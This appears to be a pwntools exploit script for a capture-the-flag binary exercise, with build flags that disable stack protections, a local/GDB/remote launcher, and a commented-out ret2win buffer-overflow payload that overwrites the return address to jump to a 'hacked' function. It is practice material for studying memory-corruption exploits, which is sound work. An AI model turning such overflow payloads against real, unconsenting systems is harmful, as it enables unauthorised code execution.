'''
gcc -fno-stack-protector -z  execstack -no-pie -m32 ret2win.c -o ret2win

telescope $esp -l 10
info functions
info functions hacked
'''
# from pwnlib.util.misc import run_in_new_terminal
from pwn import *

# run_in_new_terminal()


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
# b main
# b main
# b *0x08049216
# init-pwndbg
# b *0x0804921e
# b *0x08049202
# continue
# telescope $esp
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './locked'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-t", ":.1"]

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# print(elf.functions.hacked)
# exit()

io = start()

# # How many bytes to the instruction pointer (EIP)?
# padding = 28
#
# payload = flat(
#     b'A' * padding,
#     # elf.functions.hacked  # 0x401142
#     p32(0x08049196),
# )
#
# # Save the payload to file
# write('payload', payload)
#
# # Send the payload
io.sendlineafter(b':', "HAHAHAHAHA")
#
print(io.recvall())
# # Receive the flag
# io.interactive()